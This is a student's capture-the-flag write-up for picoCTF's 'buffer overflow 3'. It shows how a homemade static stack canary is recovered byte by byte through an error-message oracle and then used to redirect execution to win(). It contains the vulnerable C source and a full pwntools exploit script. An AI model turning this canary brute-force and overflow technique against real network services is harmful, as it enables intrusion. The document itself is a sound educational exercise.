# buffer overflow 3 — Static Stack Canary Byte-by-Byte Brute Force

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn)  
* **Difficulty:** Medium (CyLab 3)  
* **Tools:** `file`, `checksec`, GDB with `pwndbg`, Python 3 (`pwntools`)  
* **Binary:** 32-bit ELF (`vuln`) with source code `vuln.c`  

---

## TL;DR

Stack canaries are typically randomized per process by the compiler via Thread Local Storage (`%gs:0x14`). In this challenge, the program rolls its own custom canary mechanism: it reads a 4-byte static string from `canary.txt` and validates it with `memcmp()`. At first, a 4-byte secret seems impossible to brute-force over the network ($256^4 \approx 4.29$ billion attempts). However, because the canary does not change between connections and the program immediately crashes on mismatch, we can recover it **byte-by-byte** ($4 \times 256 = 1,024$ maximum attempts!). Once leaked, we pad the stack, insert the recovered canary, and overwrite `EIP` with `win()`.

---

## Student's Learning Note: Compiler Guards vs. Homebrew Canaries

In my computer security coursework, we studied compiler mitigations like GCC's `-fstack-protector`:

1. **How Real Compiler Canaries Work:** The compiler places a randomized guard value right before `saved EBP`. Its first byte is almost always a null terminator (`0x00`) to terminate vulnerable string operations like `strcpy`. It is fetched directly from thread-local storage (`%gs:0x14` on x86, `%fs:0x28` on x86_64).
2. **The Big-O Flaw in Static Canaries:** When developers roll their own canary checks (or in forking network servers where child processes inherit the parent's memory layout), the canary value remains persistent. This design flaw turns an exponential brute-force problem ($O(256^N)$) into a linear one ($O(256 \times N)$). Recovering a 4-byte canary drops from 4.29 billion requests to just 1,024 requests!

---

## Reconnaissance & Source Analysis

Examining the security properties with `checksec`:

```bash
$ checksec --file=vuln
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> [!NOTE]
> `checksec` reports `No canary found` because GCC's automatic stack guard was not used during compilation. Instead, the developers wrote a manual check in C.

Key code snippets from `vuln.c`:

```c
char global_canary[4];

void read_canary() {
    FILE *f = fopen("canary.txt", "r");
    fread(global_canary, 1, 4, f);
    fclose(f);
}

void vuln() {
    char canary[4];
    char buf[64]; // [ebp - 0x50]
    int count;

    memcpy(canary, global_canary, 4);

    printf("How Many Bytes will You Write Into the Buffer?\n> ");
    scanf("%d", &count);

    printf("Input> ");
    read(0, buf, count); // <-- Unbounded read!

    if (memcmp(canary, global_canary, 4)) {
        printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
        exit(0);
    }
    printf("Ok... Now Where's the Flag?\n");
}
```

A target `win()` function exists at `0x08049236` to print `flag.txt`.

---

## Stack Layout & The Byte-by-Byte Attack

Disassembling `vuln()` in GDB reveals the exact stack layout:

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [ebp - 0x50] (Start of buf: 64 bytes)
  |                                   |
  |     buf buffer (64 bytes)         |
  |                                   |
  +-----------------------------------+  <- [ebp - 0x10] (Local canary: 4 bytes)
  |     canary[0..3] (4 bytes)        |
  +-----------------------------------+  <- [ebp - 0x0C] (Local variables & padding: 12 bytes)
  |     padding & saved ebx           |
  +-----------------------------------+  <- [ebp] (Saved EBP: 4 bytes)
  |     Saved EBP (4 bytes)           |
  +-----------------------------------+  <- [ebp + 0x04] (Saved EIP / Return address)
  |     Saved EIP (Target: win())     |
  +-----------------------------------+
  Higher Memory Addresses
```

### Why Byte-by-Byte Works
When `count = 65`, `read()` writes 64 bytes of padding plus **1 byte** over `canary[0]`:
* If our guess matches `global_canary[0]`, `memcmp` succeeds, and the program prints:
  `"Ok... Now Where's the Flag?"`.
* If our guess is wrong, it immediately prints `"***** Stack Smashing Detected *****"`.

We iterate through each byte position:
1. Guess `canary[0]` ($0 \dots 255$) with `count = 65`.
2. Once found, lock it in and guess `canary[1]` with `count = 66`.
3. Repeat until all 4 bytes are fully recovered.

Total maximum requests: $4 \times 256 = 1,024$ attempts.

---

## My Debugging Hurdle: Remote Connection Latency

When I first ran the brute-force script over Wi-Fi, it was painfully slow—each socket connection took 200ms, and waiting for `recvall()` made the whole script take 15+ minutes.

> [!TIP]
> **Optimizing the Oracle Loop:**  
> Instead of waiting for full timeouts on every attempt, I used `p.recvuntil(b'\n', timeout=1)`. The moment `"Ok... Now Where"` appears in the line, we know we've struck gold and immediately break to the next byte index. This brought the brute-force time down to under 30 seconds!

---

## Exploit Script

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — buffer overflow 3
Exploit: Byte-by-byte static canary recovery & ret2win
"""

from pwn import *
import sys

context.log_level = 'info'
context.arch = 'i386'

WIN = 0x08049236
BUF_SIZE = 64
HOST = "xebec.cylabacademy.net"
PORT = 32048

def test_byte(count, payload):
    p = remote(HOST, PORT)
    p.recvuntil(b'> ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Input> ')
    p.send(payload)
    response = p.recvuntil(b'\n', timeout=2)
    p.close()
    return response

def main():
    canary = b""
    log.info("Brute-forcing 4-byte static canary byte-by-byte...")

    for byte_idx in range(4):
        for candidate in range(256):
            payload = b"A" * BUF_SIZE + canary + bytes([candidate])
            res = test_byte(len(payload), payload)
            if b"Ok... Now Where" in res:
                canary += bytes([candidate])
                log.success(f"Byte {byte_idx}: {hex(candidate)} -> Canary so far: {canary}")
                break

    log.success(f"Recovered Full Canary: {canary}")

    # Final Payload:
    # 64 bytes buf + 4 bytes canary + 16 bytes pad (including saved EBP) + win()
    final_payload = b"A" * BUF_SIZE + canary + b"B" * 16 + p32(WIN)

    p = remote(HOST, PORT)
    p.recvuntil(b'> ')
    p.sendline(str(len(final_payload)).encode())
    p.recvuntil(b'Input> ')
    p.send(final_payload)
    flag = p.recvrepeat(2).decode(errors="replace")
    print(flag)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag

```text
academy{redacted}
```
*(Flag redacted in accordance with competition disclosure guidelines)*

---

## Key Takeaways & Lessons

1. **Canaries Must Be Truly Random & Secret:** Storing canaries in files or static variables destroys their security guarantee. If the canary doesn't change on every fork/connection, it's trivial to peel away byte-by-byte.
2. **Oracle Feedback Enables Linear Search:** If an error message distinguishes between "valid byte" and "corrupted canary", attackers can brute-force secrets incrementally.
3. **Network I/O Optimization:** When brute-forcing over a remote connection, always set short timeouts and read only the sentinel line instead of waiting for full socket timeouts.
